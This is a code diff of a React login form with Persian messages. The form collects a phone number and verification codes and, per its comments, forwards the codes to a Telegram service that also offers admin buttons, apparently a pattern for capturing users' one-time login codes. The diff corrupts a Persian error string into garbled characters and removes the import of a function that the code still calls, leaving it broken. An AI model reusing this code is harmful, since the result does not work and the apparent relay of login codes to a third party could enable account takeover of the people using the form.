@@ -244,7 +244,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Phone submission error:", error);
       setErrors({
-        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
+        mobileNumber: "خط�� در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -263,13 +263,7 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      // In demo mode, accept any 6-digit code
       console.log("Verifying code:", verifyCode);
-
-      // Import the updatePhoneVerification function
-      const { updatePhoneVerification, showAdminButtons } = await import(
-        "@/lib/telegram-service-enhanced"
-      );
 
       // Update verification in Telegram
       const success = await updatePhoneVerification(sessionId, verifyCode);
@@ -297,7 +291,6 @@ export const LoginForm = () => {
       setIsSubmitting(false);
     }
   };
-
   // SMS code submission
   const handleSmsCodeSubmit = async () => {
     setErrors({});
